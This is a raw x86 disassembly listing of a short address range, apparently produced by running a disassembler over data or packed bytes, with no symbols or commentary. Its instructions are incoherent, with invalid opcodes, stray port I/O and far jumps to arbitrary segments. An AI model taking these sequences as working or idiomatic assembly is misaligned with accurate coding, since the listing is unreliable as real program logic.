  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	inc    ebp
  41b3a3:	out    dx,eax
  41b3a4:	into   
  41b3a5:	aam    0xf
  41b3a7:	pop    ds
  41b3a8:	add    DWORD PTR [eax],eax
  41b3aa:	pop    es
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [ebx+eax*1+0x11],bl
  41b3b1:	push   0xffffffd7
  41b3b3:	out    dx,al
  41b3b4:	push   ss
  41b3b5:	xor    esi,esp
  41b3b7:	int3   
  41b3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3b9:	or     al,0x32
  41b3bb:	pop    edi
  41b3bc:	mov    ss,WORD PTR [eax+0x78]
  41b3bf:	test   eax,0xe0dd7e83
  41b3c4:	push   0xffffff93
  41b3c6:	push   esp
  41b3c7:	inc    DWORD PTR [ecx+0x66b50437]
  41b3cd:	fdivrp st(1),st
  41b3cf:	loope  0x41b395
  41b3d1:	int3   
  41b3d2:	test   DWORD PTR [ecx+0x5a],eax
  41b3d5:	sub    ebp,DWORD PTR [edi-0x2a07a8a2]
  41b3db:	std    
  41b3dc:	dec    edi
  41b3dd:	jns    0x41b38f
  41b3df:	mov    ah,0x3b
  41b3e1:	push   ss
  41b3e2:	fistp  WORD PTR [ebx+0x45ef7ea0]
  41b3e8:	xchg   BYTE PTR [ebx-0x26],dl
  41b3eb:	dec    ebp
  41b3ec:	pop    esi
  41b3ed:	inc    esp
  41b3ee:	inc    edi
  41b3ef:	mov    al,ds:0xea342cfe
  41b3f4:	iret   
  41b3f5:	clc    
  41b3f6:	aaa    
  41b3f7:	leave  
  41b3f8:	mov    WORD PTR [edi],ds
  41b3fa:	mov    ah,0xda
  41b3fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3fd:	out    0xc2,al
  41b3ff:	fiadd  DWORD PTR [ebp+edx*8-0xe]
  41b403:	cmp    dh,BYTE PTR ds:0xaae474fc
  41b409:	in     al,dx
  41b40a:	out    dx,al
  41b40b:	out    0x72,eax
  41b40d:	sub    BYTE PTR [ebx],dl
  41b40f:	out    0x71,eax
  41b411:	inc    eax
  41b412:	xchg   esp,eax
  41b413:	lea    edx,[ebx]
  41b415:	mov    DWORD PTR [ebx+0x1bab18b4],ebx
  41b41b:	inc    eax
  41b41c:	imul   esp,edx,0xffffffc3
  41b41f:	pop    ss
  41b420:	jbe    0x41b3d1
  41b422:	add    dl,BYTE PTR [ebx-0x397b12e3]
  41b428:	call   0x40706b73
  41b42d:	cmp    DWORD PTR [ebp-0x3c],ebx
  41b430:	mov    edx,DWORD PTR es:[edx+edx*1-0x1fd6d441]
  41b438:	shr    DWORD PTR [ebp+0x9],0x27
  41b43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b43e:	cmp    al,0xd6
  41b440:	and    al,0x4d
  41b442:	pop    esp
  41b443:	cmp    edx,DWORD PTR [edi+0x57c2f1a]
  41b449:	sbb    al,0x5
  41b44b:	mov    ah,0x49
  41b44d:	add    ebp,DWORD PTR [edx+ebx*4]
  41b450:	rol    BYTE PTR ds:0xbce9d63d,1
  41b456:	xor    ebp,DWORD PTR [edx+eax*2+0x47c32b24]
  41b45d:	cmp    BYTE PTR [esp+ebx*4],dh
  41b460:	popa   
  41b461:	not    DWORD PTR [esi]
  41b463:	sub    BYTE PTR [edi+0x64],0xc6
  41b467:	xchg   ebx,eax
  41b468:	scas   al,BYTE PTR es:[edi]
  41b469:	ror    BYTE PTR [ecx+ebp*4+0x39],1
  41b46d:	sbb    ch,BYTE PTR [edi+0x58]
  41b470:	in     eax,dx
  41b471:	or     al,0x7a
  41b473:	dec    edi
  41b474:	sub    al,0xda
  41b476:	mov    DWORD PTR [edx+0x18],ecx
  41b479:	or     ch,dl
  41b47b:	cld    
  41b47c:	or     dl,cl
  41b47e:	test   dl,al
  41b480:	push   0x5537c346
  41b485:	ins    DWORD PTR es:[edi],dx
  41b486:	mov    WORD PTR [ebx],fs
  41b488:	mov    ebx,0xf95f19b2
  41b48d:	jp     0x41b4c0
  41b48f:	sti    
  41b490:	rol    DWORD PTR [ebp+esi*2-0x2a],cl
  41b494:	sub    ebx,DWORD PTR [esi-0x17e8acc9]
  41b49a:	jns    0x41b4f9
  41b49c:	dec    esi
  41b49d:	jle    0x41b492
  41b49f:	aad    0xd4
  41b4a1:	jge    0x41b4f3
  41b4a3:	adc    ecx,DWORD PTR ds:0x89e5bd5
  41b4a9:	or     BYTE PTR [esi-0x2701c204],dl
  41b4af:	jmp    0x1d:0xf280a54c
	...
  41b516:	aam    0xec
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	div    BYTE PTR [ebx+0x75]
  41b525:	and    dl,BYTE PTR [esi]
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [edx-0xb],ah
  41b530:	mov    al,ds:0xdcf18c32
  41b535:	adc    al,0xb8
  41b537:	inc    esp
  41b538:	lods   eax,DWORD PTR ds:[esi]
  41b539:	gs jne 0x41b4e2
  41b53c:	jmp    0x44e:0x11dbd39b
  41b543:	mov    dh,BYTE PTR [edx]
  41b545:	xor    eax,ebp
  41b547:	mov    ds:0x7b11e6af,eax
  41b54c:	mov    ds:0xc246bc96,eax
  41b551:	cmp    eax,DWORD PTR [edx+eax*8+0x6]
  41b555:	loop   0x41b5a9
  41b557:	cmp    BYTE PTR [ebp+0x2236e9a4],0x5d
  41b55e:	add    al,BYTE PTR [eax]
  41b560:	mov    eax,ds:0x20629e8f
  41b565:	aad    0x1b
  41b567:	jnp    0x41b500
  41b569:	mov    bl,0x53
  41b56b:	push   ds
  41b56c:	pop    esp
  41b56d:	pop    ebx
  41b56e:	rcr    DWORD PTR [ebx-0x61],1
  41b571:	mov    ds:0x691c2a3e,eax
  41b576:	push   cs
  41b577:	pop    ss
  41b578:	xchg   esp,eax
  41b579:	mov    bh,0x62
  41b57b:	jo     0x41b5b9
  41b57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b57e:	(bad)  
  41b57f:	sub    DWORD PTR [ebx],esi
  41b581:	inc    ebp
  41b582:	ret    
  41b583:	mov    DWORD PTR [ecx*2-0x6abd984c],edi
  41b58a:	and    eax,DWORD PTR [ebx]
  41b58c:	pusha  
  41b58d:	mov    edx,DWORD PTR [edx-0x1f600a3b]
  41b593:	xchg   BYTE PTR [edi-0x3a],ah
  41b596:	test   al,0xd8
  41b598:	and    al,BYTE PTR [esp+ebp*1-0x13]
  41b59c:	push   ds
  41b59d:	inc    esi
  41b59e:	(bad)  
  41b59f:	sbb    BYTE PTR [eax-0x5f],ch
  41b5a2:	cmp    al,dl
  41b5a4:	sbb    eax,0x910675c1
  41b5a9:	ds push 0xffffff94
  41b5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ad:	outs   dx,BYTE PTR ds:[esi]
  41b5ae:	shl    DWORD PTR [edi+eax*8],cl
  41b5b1:	add    BYTE PTR [ebx-0x62],al
  41b5b4:	xor    al,0x8d
  41b5b6:	mov    ebp,0xfe37df7c
  41b5bb:	pop    ebp
  41b5bc:	ins    DWORD PTR es:[edi],dx
  41b5bd:	(bad)  
  41b5be:	js     0x41b604
  41b5c0:	sub    DWORD PTR [ebx+0x88e0289],ebx
  41b5c6:	(bad)  
  41b5c7:	jmp    0xbad7:0x18e0d074
  41b5ce:	std    
  41b5cf:	dec    eax
  41b5d0:	in     al,0xae
  41b5d2:	retf   0xd3bd
  41b5d5:	or     ecx,DWORD PTR [ebx]
  41b5d7:	sbb    dl,BYTE PTR [ebp+0x2c758b4c]
  41b5dd:	clc    
  41b5de:	out    0x20,eax
  41b5e0:	sbb    DWORD PTR es:[edi-0x3b],edi
  41b5e4:	dec    ebp
  41b5e5:	mov    ah,0xc1
  41b5e7:	jns    0x41b5c9
  41b5e9:	lods   eax,DWORD PTR ds:[esi]
  41b5ea:	pop    ss
  41b5eb:	sub    bh,ch
  41b5ed:	inc    ebx
  41b5ee:	sub    esi,DWORD PTR [ebx-0x3758ca97]
  41b5f4:	cmp    BYTE PTR [esi],ah
  41b5f6:	fdivr  QWORD PTR [edi+0x0]
  41b5f9:	inc    eax
  41b5fa:	rcl    BYTE PTR [ebp-0x6b],1
  41b5fd:	pop    edx
  41b5fe:	scas   al,BYTE PTR es:[edi]
  41b5ff:	xchg   edi,eax
  41b600:	jge    0x41b5d0
  41b602:	sti    
  41b603:	aad    0xc3
  41b605:	arpl   WORD PTR [ecx+ebx*4-0x5e],bx
  41b609:	pop    edx
  41b60a:	aas    
  41b60b:	pop    ss
  41b60c:	sbb    DWORD PTR [esi+0x3c],esi
  41b60f:	and    edx,esi
  41b611:	jno    0x41b62e
  41b613:	jl     0x41b684
  41b615:	lahf   
  41b616:	fmul   st(2),st
  41b618:	mov    ebx,0xc8d5929c
  41b61d:	in     al,dx
  41b61e:	xchg   edi,eax
  41b61f:	test   al,0x8e
  41b621:	pop    ecx
  41b622:	hlt    
  41b623:	mov    esp,0xef36581e
  41b628:	pushf  
  41b629:	imul   edx,DWORD PTR [ebp-0x535252a7],0x83074c95
  41b633:	push   ebx
  41b634:	js     0x41b636
	...
  41b696:	test   al,0x63
  41b698:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b69e:	cmp    al,0x28
  41b6a0:	rol    BYTE PTR [eax],1
  41b6a2:	adc    BYTE PTR es:[ebp+edi*4+0x1211d],0x7
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [ecx],cl
  41b6af:	pop    edi
  41b6b0:	ins    BYTE PTR es:[edi],dx
  41b6b1:	fdivr  QWORD PTR [esi-0x16]
  41b6b4:	add    esp,DWORD PTR [ebx]
  41b6b6:	jp     0x41b6bf
  41b6b8:	rcr    ebx,1
  41b6ba:	mov    edx,0xcf7e7a53
  41b6bf:	setp   BYTE PTR [eax]
  41b6c2:	mov    BYTE PTR [ecx-0x55917682],ch
  41b6c8:	add    dl,0x9b
  41b6cb:	jg     0x41b6c6
  41b6cd:	xchg   esp,eax
  41b6ce:	or     esp,eax
  41b6d0:	in     al,dx
  41b6d1:	add    cl,BYTE PTR [edi+0x4c]
  41b6d4:	xchg   DWORD PTR [ebx-0x63e6c6cd],edi
  41b6da:	mov    ebp,0x65873d9f
  41b6df:	pusha  
  41b6e0:	mov    al,0x16
  41b6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e3:	ror    DWORD PTR [edx],cl
  41b6e5:	repz sar esp,0x58
  41b6e9:	lahf   
  41b6ea:	pop    eax
  41b6eb:	sbb    cl,0x80
  41b6ee:	sub    esp,eax
  41b6f0:	(bad)  
  41b6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f3:	test   al,0xb3
  41b6f5:	adc    al,0xb6
  41b6f7:	call   0xfae65c68
  41b6fc:	or     DWORD PTR [ecx],edx
  41b6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ff:	cmp    esi,edi
  41b701:	pop    esi
  41b702:	jo     0x41b68e
  41b704:	inc    ebp
  41b705:	(bad)  
  41b706:	repz pushf 
  41b708:	add    BYTE PTR [edx+esi*8],ch
  41b70b:	test   dh,ah
  41b70d:	push   edi
  41b70e:	lahf   
  41b70f:	mov    dl,0x66
  41b711:	add    eax,0x4146fe4b
  41b716:	stc    
  41b717:	push   edx
  41b718:	fwait
  41b719:	stc    
  41b71a:	add    DWORD PTR [esi+0x71ef9c5a],edi
  41b720:	gs gs dec esi
  41b723:	je     0x41b6ab
  41b725:	cmp    al,0xb
  41b727:	push   ebp
  41b728:	das    
  41b729:	call   0xe54c:0x2b507907
  41b730:	loop   0x41b732
  41b732:	out    dx,al
  41b733:	xchg   ebp,eax
  41b734:	out    0x6e,al
  41b736:	dec    esi
  41b737:	cmp    DWORD PTR [edi+0x15c10f41],ecx
  41b73d:	mov    esi,0xcb3b6dc5
  41b742:	and    ch,BYTE PTR [edx-0x36]
  41b745:	and    eax,esi
  41b747:	loopne 0x41b773
  41b749:	cmc    
  41b74a:	xor    ah,ah
  41b74c:	not    DWORD PTR [ecx-0x3aeab3f5]
  41b752:	std    
  41b753:	int3   
  41b754:	stos   BYTE PTR es:[edi],al
  41b755:	lods   eax,DWORD PTR ds:[esi]
  41b756:	lahf   
  41b757:	dec    esi
  41b758:	push   ecx
  41b759:	fiadd  WORD PTR [ebx-0x61]
  41b75c:	sub    BYTE PTR [edi+edx*2+0x7],bh
  41b760:	call   0x7e445883
  41b765:	xor    BYTE PTR [ecx-0x63],bl
  41b768:	sbb    al,0x7a
  41b76a:	adc    bh,BYTE PTR [edx+edi*4+0x2956b0c7]
  41b771:	inc    esi
  41b772:	jge    0x41b7d7
  41b774:	out    dx,eax
  41b775:	cs inc edx
  41b777:	test   al,0xfe
  41b779:	jmp    0x2b8b:0x38a7a12b
  41b780:	loopne 0x41b750
  41b782:	xchg   ebx,eax
  41b783:	aam    0xd5
  41b785:	repz cmp al,0x36
  41b788:	xchg   ebx,eax
  41b789:	pop    ebp
  41b78a:	mov    dl,0xaf
  41b78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b78d:	aas    
  41b78e:	mov    eax,ds:0x50ddc19f
  41b793:	inc    edi
  41b794:	mov    esp,0x34d25030
  41b799:	xor    ch,ch
  41b79b:	mov    ds:0xd3c6aace,al
  41b7a0:	ds push ecx
  41b7a2:	fild   DWORD PTR [esi]
  41b7a4:	scas   al,BYTE PTR es:[edi]
  41b7a5:	in     eax,0x43
  41b7a7:	cmp    eax,0xcc85d762
  41b7ac:	dec    esp
  41b7ad:	jg     0x41b7ac
  41b7af:	adc    BYTE PTR [ebx+0x57],cl
  41b7b2:	repz ror DWORD PTR [eax],cl
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x84,al
  41b823:	jmp    FWORD PTR [edx+eax*1]
  41b826:	and    al,0x22
  41b828:	add    DWORD PTR [eax],eax
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [ebx-0x347ea98d],cl
  41b833:	pop    ds
  41b834:	iret   
  41b835:	mov    ah,0x32
  41b837:	and    DWORD PTR [edx-0x750a3321],esi
  41b83d:	sbb    ebx,DWORD PTR ds:0x54c947b5
  41b843:	ds mov bh,0x12
  41b846:	dec    ebp
  41b847:	mov    al,ds:0x88ff00e8
  41b84c:	cmp    BYTE PTR [edi],0xef
  41b84f:	js     0x41b8ad
  41b851:	std    
  41b852:	lds    esp,FWORD PTR [edx+0x3d]
  41b855:	xchg   edi,eax
  41b856:	sbb    dh,BYTE PTR [ecx+eiz*8-0x1011cf90]
  41b85d:	(bad)  
  41b85e:	jb     0x41b867
  41b860:	mov    eax,ds:0x689a4354
  41b865:	push   edx
  41b866:	(bad)  
  41b867:	dec    esp
  41b868:	and    eax,0xa261a248
  41b86d:	inc    ecx
  41b86e:	dec    ebx
  41b86f:	push   ebx
  41b870:	mov    eax,ds:0x9d0176a5
  41b875:	mov    eax,0x71959ff5
  41b87a:	iret   
  41b87b:	adc    al,0xcd
  41b87d:	mov    dh,0xdc
  41b87f:	fcomi  st,st(0)
  41b881:	nop
  41b882:	repnz cmp DWORD PTR [edi+0x35],0x7bd6ab39
  41b88a:	dec    esi
  41b88b:	mov    WORD PTR [ecx-0x5f59a164],es
  41b891:	enter  0x8881,0x23
  41b895:	adc    cl,0x9a
  41b898:	or     bh,dl
  41b89a:	jle    0x41b8db
  41b89c:	shr    DWORD PTR ds:0x6bec8ad1,cl
  41b8a2:	pop    esi
  41b8a3:	inc    esi
  41b8a4:	push   eax
  41b8a5:	(bad)  
  41b8a6:	or     al,BYTE PTR ds:0x89700382
  41b8ac:	sbb    BYTE PTR [edi-0x1f0d0324],dl
  41b8b2:	mov    ds:0x602ec71a,eax
  41b8b7:	mov    ds:0x8da7360b,eax
  41b8bc:	aas    
  41b8bd:	or     BYTE PTR [eax],al
  41b8bf:	out    0xdc,al
  41b8c1:	mov    esp,0xc5f330b0
  41b8c6:	dec    esi
  41b8c7:	clc    
  41b8c8:	ret    0xd885
  41b8cb:	daa    
  41b8cc:	or     eax,DWORD PTR [edx]
  41b8ce:	xchg   ebx,eax
  41b8cf:	mov    cs,ebx
  41b8d1:	stos   DWORD PTR es:[edi],eax
  41b8d2:	nop
  41b8d3:	pusha  
  41b8d4:	mov    eax,ds:0x483c591b
  41b8d9:	adc    esp,DWORD PTR [ebp-0x5e]
  41b8dc:	aam    0x9a
  41b8de:	aaa    
  41b8df:	cmp    al,BYTE PTR [eax+0x50]
  41b8e2:	std    
  41b8e3:	push   es
  41b8e4:	push   ebp
  41b8e5:	call   0xd095:0xa3ed4ac5
  41b8ec:	and    esi,DWORD PTR [ecx]
  41b8ee:	stos   BYTE PTR es:[edi],al
  41b8ef:	mov    BYTE PTR [edi-0x55b34f18],0xb8
  41b8f6:	cwde   
  41b8f7:	mov    ds:0xa21a8a93,al
  41b8fc:	shl    DWORD PTR [ebx-0x33],cl
  41b8ff:	outs   dx,BYTE PTR ds:[esi]
  41b900:	mov    eax,ds:0xa0cce36
  41b905:	push   0x3a326215
  41b90a:	inc    ecx
  41b90b:	iret   
  41b90c:	or     BYTE PTR ds:0xa257733f,0xb4
  41b913:	xchg   edx,ebx
  41b915:	fnstcw WORD PTR [edi-0x40a1108a]
  41b91b:	cmp    al,0x67
  41b91d:	jns    0x41b8de
  41b91f:	shr    esp,0x8d
  41b922:	mov    edi,0x779b87b
  41b927:	jg     0x41b9a4
  41b929:	or     al,0x57
  41b92b:	xchg   esi,eax
  41b92c:	mov    esi,0x7b12b6f1
  41b931:	stos   DWORD PTR es:[edi],eax
  41b932:	cmp    bl,BYTE PTR [ecx+0x3e]
	...
  41b994:	add    BYTE PTR [eax],al
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	(bad)  
  41b9a3:	mov    WORD PTR [esi],cs
  41b9a5:	lea    ebp,[ebx]
  41b9a7:	and    eax,DWORD PTR [ecx]
  41b9a9:	add    BYTE PTR [edi],al
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [edi],bh
  41b9af:	push   edi
  41b9b0:	ins    BYTE PTR es:[edi],dx
  41b9b1:	xchg   edx,eax
  41b9b2:	mov    ebp,0xf5f7ea7d
  41b9b7:	cmp    al,0xfc
  41b9b9:	jge    0x41b967
  41b9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9bc:	mov    esp,0x6f4e384d
  41b9c1:	int    0x45
  41b9c3:	int3   
  41b9c4:	push   0xffffffac
  41b9c6:	cmc    
  41b9c7:	aad    0xe4
  41b9c9:	mov    ebx,0xc99d7e8f
  41b9ce:	rol    BYTE PTR [ebx-0x494e57d5],1
  41b9d4:	cwde   
  41b9d5:	inc    edi
  41b9d6:	ss aas 
  41b9d8:	in     eax,dx
  41b9d9:	test   DWORD PTR ds:0xf71b888e,0xf30199c7
  41b9e3:	xor    al,0xfb
  41b9e5:	sub    al,0x76
  41b9e7:	int    0xbc
  41b9e9:	jp     0x41b974
  41b9eb:	shr    DWORD PTR [edx-0xb],1
  41b9ee:	inc    esi
  41b9ef:	iret   
  41b9f0:	mov    cl,0x47
  41b9f2:	popa   
  41b9f3:	xchg   edi,eax
  41b9f4:	xor    ch,cl
  41b9f6:	xchg   esp,eax
  41b9f7:	ds hlt 
  41b9f9:	pop    ebx
  41b9fa:	sahf   
  41b9fb:	mov    ebp,0x9887959
  41ba00:	cld    
  41ba01:	jmp    0xf58:0x51dee519
  41ba08:	ror    BYTE PTR [ecx],cl
  41ba0a:	and    eax,0xb04b50f5
  41ba0f:	mov    BYTE PTR [esi+esi*2+0x76],ch
  41ba13:	stc    
  41ba14:	into   
  41ba15:	push   edx
  41ba16:	mov    fs,WORD PTR [ebx-0x6d]
  41ba19:	xchg   edx,eax
  41ba1a:	mov    esi,DWORD PTR [edx]
  41ba1c:	or     eax,0x6a010193
  41ba21:	mov    ebx,0xf36b9c81
  41ba26:	cld    
  41ba27:	fsub   st(6),st
  41ba29:	add    eax,DWORD PTR [esi+edx*8]
  41ba2c:	xchg   esp,eax
  41ba2d:	sbb    dl,BYTE PTR [eax+0x70]
  41ba30:	xchg   edx,eax
  41ba31:	mov    ds:0xb8d6b50,eax
  41ba36:	sahf   
  41ba37:	dec    eax
  41ba38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba39:	clc    
  41ba3a:	cmp    BYTE PTR [esi+0x41fb9fe0],ah
  41ba40:	ret    
  41ba41:	out    0xc7,eax
  41ba43:	repz pop esi
  41ba45:	popa   
  41ba46:	mov    bl,0x85
  41ba48:	push   0x64f40cf5
  41ba4d:	mov    ebp,0x84e1a5a0
  41ba52:	jg     0x41b9ed
  41ba54:	mov    ebx,0x8871c3e6
  41ba59:	jge    0x41bac6
  41ba5b:	outs   dx,BYTE PTR ds:[esi]
  41ba5c:	aad    0xd
  41ba5e:	and    ah,al
  41ba60:	pop    ebp
  41ba61:	iret   
  41ba62:	shl    BYTE PTR [ebx+0x5e],cl
  41ba65:	add    al,0x87
  41ba67:	jp     0x41ba2d
  41ba69:	xchg   esi,eax
  41ba6a:	sub    dh,ch
  41ba6c:	inc    esi
  41ba6d:	rol    BYTE PTR [eax],cl
  41ba6f:	lods   eax,DWORD PTR ds:[esi]
  41ba70:	add    dl,BYTE PTR [edx+0x40bc12a]
  41ba76:	ins    BYTE PTR es:[edi],dx
  41ba77:	sub    DWORD PTR [ecx],0xffffffbf
  41ba7a:	leave  
  41ba7b:	xchg   DWORD PTR [ecx-0x7891d42d],eax
  41ba81:	sti    
  41ba82:	fsub   DWORD PTR [eax+eiz*1-0x420cd98d]
  41ba89:	test   eax,0xfb0df8c1
  41ba8e:	in     eax,dx
  41ba8f:	jl     0x41baf4
  41ba91:	outs   dx,BYTE PTR ds:[esi]
  41ba92:	mov    eax,ds:0x8f82065e
  41ba97:	sti    
  41ba98:	(bad)  
  41ba9a:	jmp    0x41ba22
  41ba9c:	push   es
  41ba9d:	popa   
  41ba9e:	scas   eax,DWORD PTR es:[edi]
  41ba9f:	mov    esp,0x63890ecf
  41baa4:	test   al,0xa
  41baa6:	loopne 0x41ba30
  41baa8:	xor    esi,ebp
  41baaa:	mov    bl,0xb0
  41baac:	adc    bh,bh
  41baae:	leave  
  41baaf:	add    BYTE PTR [edx],0xdf
  41bab2:	popf   
  41bab3:	js     0x41ba47
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	ret    
  41bb23:	dec    ebp
  41bb24:	mov    ds:0x12432c6,eax
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [eax-0x3f],ah
  41bb30:	add    eax,0xad17a48f
  41bb35:	(bad)  
  41bb36:	add    eax,0x1c907cd7
  41bb3b:	mov    eax,ds:0xe97d25b1
  41bb40:	jl     0x41bacb
  41bb42:	jge    0x41bb2f
  41bb44:	push   ss
  41bb45:	adc    ebp,edx
  41bb47:	lods   al,BYTE PTR ds:[esi]
  41bb48:	aad    0xc9
  41bb4a:	in     eax,dx
  41bb4b:	xchg   esi,eax
  41bb4c:	xor    al,0x57
  41bb4e:	pop    esi
  41bb4f:	add    DWORD PTR [esi-0x4319df5f],0x32
  41bb56:	out    0x6d,al
  41bb58:	cmp    al,0x3d
  41bb5a:	mov    bh,0x77
  41bb5c:	xor    BYTE PTR [edx+0x5a],dh
  41bb5f:	sbb    BYTE PTR [esp+esi*2-0x76b40e2f],bh
  41bb66:	ret    
  41bb67:	pop    esi
  41bb68:	aam    0xa6
  41bb6a:	dec    ecx
  41bb6b:	scas   eax,DWORD PTR es:[edi]
  41bb6c:	bound  ebp,QWORD PTR [edi-0xa692423]
  41bb72:	jcxz   0x41baff
  41bb75:	mov    ch,0x10
  41bb77:	idiv   BYTE PTR [ecx-0x291671c0]
  41bb7d:	jmp    0x41bb90
  41bb7f:	nop
  41bb80:	jl     0x41bbd2
  41bb82:	gs inc esp
  41bb84:	sub    eax,0xb5d4ea04
  41bb89:	mov    ds:0x826bf689,eax
  41bb8e:	jp     0x41bb7c
  41bb90:	jge    0x41bb3a
  41bb92:	(bad)  
  41bb94:	dec    esi
  41bb95:	out    dx,al
  41bb96:	mov    esp,0x29b3f421
  41bb9b:	lods   al,BYTE PTR ds:[esi]
  41bb9c:	and    esi,DWORD PTR [edi]
  41bb9e:	nop
  41bb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bba0:	aam    0x8
  41bba2:	(bad)  [esi+ebp*2+0x460f83b3]
  41bba9:	pop    esp
  41bbaa:	cmp    BYTE PTR [ebx+edx*1+0xc],dh
  41bbae:	xchg   edx,eax
  41bbaf:	iret   
  41bbb0:	test   DWORD PTR [eax+0x1b],esp
  41bbb3:	mov    ds:0xddc36a1d,al
  41bbb8:	push   0x54
  41bbba:	cwde   
  41bbbb:	ja     0x41bb95
  41bbbd:	jbe    0x41bc08
  41bbbf:	inc    ecx
  41bbc0:	gs pusha 
  41bbc2:	mov    edi,0x11fd8e4f
  41bbc7:	jns    0x41bbd7
  41bbc9:	add    al,0xf6
  41bbcb:	inc    edx
  41bbcc:	test   DWORD PTR [edi-0x27],eax
  41bbcf:	les    eax,FWORD PTR [edi+ecx*8]
  41bbd2:	xchg   edx,eax
  41bbd3:	push   0xffffff83
  41bbd5:	inc    ecx
  41bbd6:	or     BYTE PTR ds:0xf3f436c2,ah
  41bbdc:	daa    
  41bbdd:	push   esi
  41bbde:	ror    bl,1
  41bbe0:	nop
  41bbe1:	daa    
  41bbe2:	jle    0x41bc03
  41bbe4:	fnstsw WORD PTR [ebx+ebx*8+0x5a]
  41bbe8:	mov    edi,DWORD PTR [esi+ebx*4-0x44]
  41bbec:	add    ch,BYTE PTR [ebx-0x2c]
  41bbef:	pop    edx
  41bbf0:	and    eax,0xcad419ec
  41bbf5:	lods   eax,DWORD PTR ds:[esi]
  41bbf6:	pop    ebp
  41bbf7:	push   ecx
  41bbf8:	mov    dl,0x42
  41bbfa:	mov    ch,0x8
  41bbfc:	cmp    ebx,DWORD PTR [ebx+0x1d]
  41bbff:	clc    
  41bc00:	push   edi
  41bc01:	aad    0xe
  41bc03:	push   0x7e968c3b
  41bc08:	cmp    edi,0x7
  41bc0b:	outs   dx,BYTE PTR ds:[esi]
  41bc0c:	or     al,0xc2
  41bc0e:	loop   0x41bc50
  41bc10:	fsub   DWORD PTR [eax]
  41bc12:	sub    esp,ebp
  41bc14:	inc    ebp
  41bc15:	data16 xor ah,bl
  41bc18:	cmp    ecx,edi
  41bc1a:	fimul  DWORD PTR [edi]
  41bc1c:	sub    al,0x48
  41bc1e:	cli    
  41bc1f:	pop    esi
  41bc20:	aaa    
  41bc21:	ficom  DWORD PTR [ebp-0x3d073045]
  41bc27:	je     0x41bc97
  41bc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2a:	add    esp,DWORD PTR [ebp-0x46d41b58]
  41bc30:	imul   ebx,DWORD PTR [esi+0x52af95],0x0
	...
  41bc96:	shl    BYTE PTR [edx],cl
  41bc98:	cli    
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0xa9e7248d
  41bca4:	rcr    DWORD PTR [ecx],1
  41bca6:	cmp    DWORD PTR ds:0x1070001,esp
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	outs   dx,DWORD PTR ds:[esi]
  41bcaf:	lock leave 
  41bcb1:	xor    eax,DWORD PTR [ebx-0x32728d14]
  41bcb7:	daa    
  41bcb8:	idiv   BYTE PTR [ebx+0x8638546]
  41bcbe:	imul   esp,DWORD PTR [edx],0x8afe4f2c
  41bcc4:	cdq    
  41bcc5:	add    ebp,eax
  41bcc7:	pop    ebx
  41bcc8:	sti    
  41bcc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcca:	stc    
  41bccb:	push   cs
  41bccc:	sbb    al,0x72
  41bcce:	retf   0xa3ad
  41bcd1:	mov    cl,0xbf
  41bcd3:	(bad)  
  41bcd4:	std    
  41bcd5:	add    dh,0xe4
  41bcd8:	push   ebx
  41bcd9:	ror    DWORD PTR [edi-0x4f76db78],1
  41bcdf:	mov    ecx,0xb89eff5b
  41bce4:	ja     0x41bd29
  41bce6:	sub    dh,dl
  41bce8:	adc    dh,dl
  41bcea:	jne    0x41bcba
  41bcec:	aam    0xb4
  41bcee:	js     0x41bce4
  41bcf0:	mov    eax,ds:0x12c986f2
  41bcf5:	scas   al,BYTE PTR es:[edi]
  41bcf6:	jge    0x41bc8a
  41bcf8:	scas   al,BYTE PTR es:[edi]
  41bcf9:	js     0x41bcde
  41bcfb:	add    al,0xbc
  41bcfd:	sbb    DWORD PTR [eax],ecx
  41bcff:	push   edi
  41bd00:	je     0x41bd1d
  41bd02:	cli    
  41bd03:	dec    eax
